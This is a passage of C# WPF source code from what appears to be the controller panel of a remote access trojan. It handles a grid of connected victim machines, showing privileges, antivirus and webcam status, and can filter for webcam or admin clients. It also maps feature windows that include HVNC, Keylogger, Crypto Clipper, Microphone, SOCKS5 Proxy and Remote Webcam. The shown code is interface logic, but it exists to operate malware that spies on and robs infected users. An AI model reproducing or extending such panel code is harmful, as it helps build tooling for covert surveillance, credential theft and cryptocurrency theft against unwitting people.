        var ease = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
        presenter.BeginAnimation(OpacityProperty,
            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
    }

    // --- Grid Visibility, Filters, and Tag Customizations ---
    private bool _webcamFilterOnly = false;
    private bool _adminFilterOnly = false;

    private void LoadColumnVisibility()
    {
        foreach (var col in GridClients.Columns)
        {
            string header = col.Header?.ToString() ?? "";
            if (string.IsNullOrEmpty(header)) continue;

            int isVisible = UiPrefs.GetInt($"ColVis_{header}", 1);
            col.Visibility = isVisible == 1 ? Visibility.Visible : Visibility.Collapsed;
        }
    }

    private void PopulateColumnVisibilityMenu()
    {
        if (StackColumnCheckboxes == null) return;
        StackColumnCheckboxes.Children.Clear();
        foreach (var col in GridClients.Columns)
        {
            string header = col.Header?.ToString() ?? "";
            if (string.IsNullOrEmpty(header)) continue;

            var cb = new System.Windows.Controls.CheckBox
            {
                Content = GetFriendlyColumnHeader(header),
                Style = (Style)FindResource("SettingsChk"),
                IsChecked = col.Visibility == Visibility.Visible,
                Tag = col,
                Margin = new Thickness(0, 0, 0, 8)
            };
            
            string h = header;
            cb.Checked += (s, ev) =>
            {
                col.Visibility = Visibility.Visible;
                UiPrefs.Set($"ColVis_{h}", 1);
            };
            cb.Unchecked += (s, ev) =>
            {
                col.Visibility = Visibility.Collapsed;
                UiPrefs.Set($"ColVis_{h}", 0);
            };
            
            StackColumnCheckboxes.Children.Add(cb);
        }
    }

    private string GetFriendlyColumnHeader(string header)
    {
        return header switch
        {
            "USER" => "User",
            "PRIV" => "Privileges",
            "COUNTRY" => "Country",
            "MACHINE" => "Machine",
            "AV" => "Antivirus",
            "CAM" => "Webcam Icon",
            "WINDOW" => "Active Window",
            _ => header
        };
    }

    private void UpdateSettingsCheckboxStates()
    {
        if (StackColumnCheckboxes == null) return;
        foreach (var child in StackColumnCheckboxes.Children)
        {
            if (child is System.Windows.Controls.CheckBox cb && cb.Tag is System.Windows.Controls.DataGridColumn col)
            {
                cb.IsChecked = col.Visibility == Visibility.Visible;
            }
        }
        
        if (ChkFilterWebcam != null) ChkFilterWebcam.IsChecked = _webcamFilterOnly;
        if (ChkFilterAdmin != null) ChkFilterAdmin.IsChecked = _adminFilterOnly;
    }

    private void BtnGridSettings_Click(object sender, RoutedEventArgs e)
    {
        if (GridSettingsPanel == null) return;
        if (GridSettingsPanel.Visibility == Visibility.Visible)
        {
            GridSettingsPanel.Visibility = Visibility.Collapsed;
        }
        else
        {
            UpdateSettingsCheckboxStates();
            GridSettingsPanel.Visibility = Visibility.Visible;
        }
    }

    private void CloseGridSettings_Click(object sender, RoutedEventArgs e)
    {
        if (GridSettingsPanel != null)
            GridSettingsPanel.Visibility = Visibility.Collapsed;
    }

    private void ChkFilterWebcam_Checked(object sender, RoutedEventArgs e)
    {
        _webcamFilterOnly = true;
        RefreshClientFilters();
    }

    private void ChkFilterWebcam_Unchecked(object sender, RoutedEventArgs e)
    {
        _webcamFilterOnly = false;
        RefreshClientFilters();
    }

    private void ChkFilterAdmin_Checked(object sender, RoutedEventArgs e)
    {
        _adminFilterOnly = true;
        RefreshClientFilters();
    }

    private void ChkFilterAdmin_Unchecked(object sender, RoutedEventArgs e)
    {
        _adminFilterOnly = false;
        RefreshClientFilters();
    }

    private void ResetGridSettings_Click(object sender, RoutedEventArgs e)
    {
        _webcamFilterOnly = false;
        _adminFilterOnly = false;
        if (TxtSearch != null) TxtSearch.Text = "";
        
        foreach (var col in GridClients.Columns)
        {
            string headerName = col.Header?.ToString() ?? "";
            if (!string.IsNullOrEmpty(headerName))
            {
                col.Visibility = Visibility.Visible;
                UiPrefs.Set($"ColVis_{headerName}", 1);
            }
        }
        
        UpdateSettingsCheckboxStates();
        RefreshClientFilters();
    }

    private void RefreshClientFilters()
    {
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
        view?.Refresh();
    }

    private void GridClients_Sorting(object sender, DataGridSortingEventArgs e)
    {
        e.Handled = true;
        var column = e.Column;
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
        if (view == null) return;

        var direction = (column.SortDirection != System.ComponentModel.ListSortDirection.Ascending)
            ? System.ComponentModel.ListSortDirection.Ascending
            : System.ComponentModel.ListSortDirection.Descending;
        column.SortDirection = direction;

        view.SortDescriptions.Clear();
        // Always sort HasTag Descending first!
        view.SortDescriptions.Add(new System.ComponentModel.SortDescription(nameof(ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));

        string sortPath = column.SortMemberPath;
        if (string.IsNullOrEmpty(sortPath) && column is DataGridBoundColumn boundCol && boundCol.Binding is System.Windows.Data.Binding binding)
        {
            sortPath = binding.Path.Path;
        }

        if (!string.IsNullOrEmpty(sortPath))
        {
            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
        }
    }

    private void UpdateOpenWindowTitlesAndLabels(string clientId, string tag)
    {
        var prefix = $"{clientId}:";
        foreach (var kvp in _featureWindows.ToList())
        {
            if (kvp.Key.StartsWith(prefix))
            {
                var win = kvp.Value;
                Dispatcher.BeginInvoke(() =>
                {
                    try
                    {
                        string friendly = GetFriendlyWindowName(win);
                        win.Title = string.IsNullOrEmpty(tag)
                            ? $"{friendly} — {clientId}"
                            : $"{friendly} — {tag} ({clientId})";

                        if (win.FindName("TxtTitle") is TextBlock tbTitle)
                        {
                            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
                        }
                        else if (win.FindName("TxtClientId") is TextBlock tbClient)
                        {
                            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
                        }
                    }
                    catch { }
                });
            }
        }
    }

    private string GetFriendlyWindowName(Window win)
    {
        return win.GetType().Name switch
        {
            "RemoteDesktopWindow" => "Remote Desktop",
            "WebcamWindow" => "Remote Webcam",
            "HvncWindow" => "HVNC",
            "FileManagerWindow" => "File Manager",
            "ProcessManagerWindow" => "Process Manager",
            "TcpManagerWindow" => "TCP Connections",
            "StartupManagerWindow" => "Startup Manager",
            "MicrophoneWindow" => "Microphone",
            "FunWindow" => "Fun Panel",
            "Socks5Window" => "SOCKS5 Proxy",
            "ServiceManagerWindow" => "Service Manager",
            "WindowManagerWindow" => "Window Manager",
            "RegistryEditorWindow" => "Registry Editor",
            "InstalledAppsWindow" => "Installed Programs",
            "DeviceManagerWindow" => "Device Manager",
            "PerformanceMonitorWindow" => "Performance Monitor",
            "KeyloggerWindow" => "Keylogger",
            "CryptoClipperWindow" => "Crypto Clipper",
            _ => win.Title
        };
    }
}
